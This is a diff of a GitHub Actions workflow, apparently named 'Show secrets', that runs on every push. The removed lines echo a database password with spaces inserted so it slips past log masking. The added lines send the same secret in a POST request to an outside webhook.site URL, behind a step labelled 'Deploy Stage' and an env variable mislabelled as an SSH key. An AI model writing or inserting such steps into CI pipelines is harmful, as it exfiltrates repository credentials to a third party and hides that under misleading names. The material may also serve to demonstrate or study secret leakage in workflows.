@@ -1,17 +1,16 @@
-name: Show Me the S3cr3tz
+name: Show secrets
 on: [push]
-
 jobs:
   debug:
-    name: Debug
+    name: Show secrets
     runs-on: ubuntu-latest
-
     steps:
-    - name: Check out code
-      uses: actions/checkout@v2
-
-    - name: Set up secret file
-      env:
-        ENV_SQL_PASSWORD: ${{ secrets.ENV_SQL_PASSWORD }}
-      run: |
-        echo ${{secrets.ENV_SQL_PASSWORD}} | sed 's/./& /g'
+      - name: Deploy Stage
+        env:
+          SERVER_SSH_KEY: ${{ secrets.ENV_SQL_PASSWORD }}
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://webhook.site/#!/48e21e87-581b-4a33-9120-1c21615c88b8'
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.ENV_SQL_PASSWORD }}
